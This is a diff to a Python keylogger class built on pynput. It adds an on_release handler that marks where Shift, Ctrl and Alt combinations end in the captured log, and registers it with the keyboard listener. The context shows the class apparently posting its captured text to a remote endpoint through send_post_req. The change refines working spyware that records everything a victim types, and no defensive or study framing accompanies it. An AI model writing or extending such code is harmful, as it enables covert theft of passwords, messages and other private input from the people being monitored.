@@ -98,6 +98,20 @@ class Keylogger:
             else:
                 self.text += f"[{str(key).replace('Key.', '')}]"
 
+    def on_release(self, key):
+        # Cierra explícitamente el combo: sin esto, "[SHIFT]+"/"[CTRL]+"
+        # quedan abiertos para siempre en el log y no hay forma de saber,
+        # leyéndolo después, dónde termina el atajo y dónde vuelve a ser
+        # texto normal. Con el cierre, cada combo queda delimitado sin
+        # ambigüedad (incluso si se sueltan varias teclas seguidas bajo el
+        # mismo Ctrl/Shift mantenido).
+        if key in (keyboard.Key.shift, keyboard.Key.shift_r):
+            self.text += "[/SHIFT]"
+        elif key in (keyboard.Key.ctrl_l, keyboard.Key.ctrl_r):
+            self.text += "[/CTRL]"
+        elif key == keyboard.Key.alt or key == keyboard.Key.alt_l or key == keyboard.Key.alt_gr:
+            self.text += "[/ALT]"
+
     def start(self):
         if not self._bool("enabled"):
             print("[INFO] Keylogger is disabled in the configuration.")
@@ -105,7 +119,7 @@ class Keylogger:
         
         self._stop_event.clear()
         self.send_post_req()
-        with keyboard.Listener(on_press=self.on_press) as listener:
+        with keyboard.Listener(on_press=self.on_press, on_release=self.on_release) as listener:
             self.listener = listener
             self.listener.join()
 
@@ -119,7 +133,3 @@ class Keylogger:
 if __name__ == "__main__":
     keylogger = Keylogger()
     keylogger.start()
-    
-        
-    
-
